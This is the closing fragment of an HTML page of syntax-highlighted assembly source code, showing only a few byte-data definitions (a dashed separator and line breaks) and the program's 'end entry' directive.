        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'----------------------------'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">

                        </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">entry</span><span class="sc0">
</span></div></body>
</html>
